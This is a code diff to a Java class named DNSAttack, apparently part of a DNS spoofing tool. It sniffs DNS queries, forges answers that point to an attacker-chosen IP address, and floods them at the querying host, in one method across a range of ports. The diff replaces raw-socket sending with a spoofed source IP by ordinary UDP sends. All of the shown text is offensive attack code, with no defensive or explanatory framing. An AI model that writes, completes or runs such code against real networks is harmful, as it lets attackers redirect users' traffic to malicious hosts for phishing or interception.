@@ -71,13 +71,12 @@ public class DNSAttack {
             ArrayList<Packet> packets = sniffer.sniff(1);
             System.out.println(packets.get(0));
             UDPPacketData udpPacketData = new UDPPacketData(packets.get(0));
-            //UDPSocket udpSocket = new UDPSocket(udpPacketData.getReceiverPort());
+            UDPSocket udpSocket = new UDPSocket(udpPacketData.getReceiverPort());
             byte[] answer = generateDNSAnswer(packets.get(0).data, erroneousIP);
             long loopStopMillis = System.currentTimeMillis() + timeoutMillis;
             while (System.currentTimeMillis() < loopStopMillis)
-                //udpSocket.sendUDPPacket(udpPacketData.getSenderIP(), udpPacketData.getSenderPort(), answer);
-                UDPSocket.SendUDPPacketNative(udpPacketData.getReceiverIP(), udpPacketData.getReceiverPort(), udpPacketData.getSenderIP(), udpPacketData.getSenderPort(), answer);
-            //udpSocket.close();
+                udpSocket.sendUDPPacket(udpPacketData.getSenderIP(), udpPacketData.getSenderPort(), answer);
+            udpSocket.close();
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -85,7 +84,7 @@ public class DNSAttack {
 
     /* In order for this function to work, the attacked machine
         needs to query the machine where this function is running. */
-    public void sendFakeAnswerToHost(String fakeSourceIP, int timeoutMillis, String erroneousIP) {
+    public void sendFakeAnswerToHost(int timeoutMillis, String erroneousIP) {
         int numCores = Runtime.getRuntime().availableProcessors();
         try {
             UDPSocket udpSocket = new UDPSocket(dnsPort);
@@ -102,12 +101,11 @@ public class DNSAttack {
                     final int lastPort = Math.min(assignedPorts + portsByCore, numPorts) - 1;
                     //new Thread(() -> {
                     for (int port = firstPort; port <= lastPort; port++) {
-                        UDPSocket.SendUDPPacketNative(fakeSourceIP, dnsPort, dnsQueryPacket.getAddress().getHostAddress(), dnsQueryPacket.getPort(), answer);
-                        /*try {
+                        try {
                             udpSocket.sendUDPPacket(dnsQueryPacket.getAddress().getHostAddress(), dnsQueryPacket.getPort(), answer);
                         } catch (IOException e) {
                             e.printStackTrace();
-                        }*/
+                        }
                     }
                     //}).start();
                 }
